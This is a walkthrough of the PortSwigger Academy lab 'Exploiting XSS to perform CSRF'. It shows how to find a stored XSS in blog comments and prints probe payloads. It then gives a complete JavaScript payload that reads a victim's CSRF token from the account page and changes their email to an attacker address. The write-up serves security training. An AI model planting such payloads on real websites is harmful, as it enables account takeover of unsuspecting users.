# Write-up: Exploiting XSS to perform CSRF @ PortSwigger Academy

![logo](img/logo.png)

This write-up for the lab *Exploiting XSS to perform CSRF* is part of my walk-through series for [PortSwigger's Web Security Academy](https://portswigger.net/web-security).

Learning path: Client-side â†’ Cross-site scripting (XSS)

Lab-Link: <https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf>  
Difficulty: PRACTITIONER  
Python script: [script.py](script.py)  

## Lab description

## Steps

### Analysis

As usual, the first step is to analyze the functionality of the lab application, in this case, a blog website.

### Find stored XSS

There is one place within the public pages where any visitor can add content: the comment sections under each article (the lab description already states where it is, but it is the only place to store something anyway).

So I try if I am able to insert HTML tags within the fields:

![inserted_html](img/inserted_html.png)

![inserted_html_result](img/inserted_html_result.png)

In the name, the tags are properly encoded. However, my tags within the comment appear to get inserted directly back into the page content.

As a next step I want to find the answer to two questions:

- Can I insert a full script block?
- Can I add a script within an `<img>` tag?
- Are there any relevant characters that are blocked or encoded so that I can not use them in the XSS?

To find these answers, I use the following payload:

```
<script>alert(document.domain)</script>
<img src=x onerror='alert(document.domain)' />
xX';!--"<XSS>=\&{()}<br />Xx
```

When I view the comment, I get both alert boxes and see all characters in the HTML source. I found my place for inserting the stored XSS.

### Find out how to change email

Now it is time to use the provided credentials and log in as a `wiener`. The objective of the lab is to change the email of a victim, so I look at how this works:

![email_change](img/email_change.png)

The request is protected by a CSRF token which is stored in a hidden input field of the email change form.

Generally speaking, such a token is the proper way to protect against CSRF attacks and browsers will prevent me from reading content via JavaScript from other origins.

In this case, however, I have an XSS vulnerability at hand where this restriction does not apply as it is running at the very same origin.

### Chain the vulnerabilities

To get things working, I need to chain these vulnerabilities together:

- A CSRF attack that sends the request to change the email
- The stored XSS obtains the CSRF token and delivers that CSRF attack

My XSS needs to extract the CSRF token from the `/my-account` page. The most flexible way is to use a regular expression to both parse through the HTML and return the token. 

A quick search brought me to the documentation of [match](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/match) and how to interpret its return value:

![match_docu](img/match_docu.png)

To find the proper expression I turn to [regex101](https://regex101.com/), using the full HTML source of the account page as the test string.

![regex_crafter](img/regex_crafter.png)

With this tool, I find my regex to be `csrf" value="(\w+)"`. Not using the `g` flag ensures that the CSRF token is included in the result of the match as the second item in the return array of `match`

### The malicious comment

Now is the time to put everything together. My XSS comment now looks like this:

```html
<script>
var r = new XMLHttpRequest();
r.onload=function() {
    csrf = this.responseText.match(/csrf" value="(\w+)"/)[1];
    var attack = new XMLHttpRequest();
    attack.open("POST", "https://0a74007e040c37b4c0f5013c009600e3.web-security-academy.net/my-account/change-email", true);
    attack.send("email=mail@evil.me&csrf=" + csrf);
}
r.open("GET", "https://0a74007e040c37b4c0f5013c009600e3.web-security-academy.net/my-account", true);
r.withCredential = true;
r.send();
</script>
```

First, it gets the account website. From the result, it extracts the CSRF token and issues another request to the email change functionality.

Right after sending the comment, the lab updates to

![success](img/success.png)

After manually accessing the comment page and going to the account page I can verify that the email was indeed changed by just viewing the comment:

![verify_changed_email](img/verify_changed_email.png)
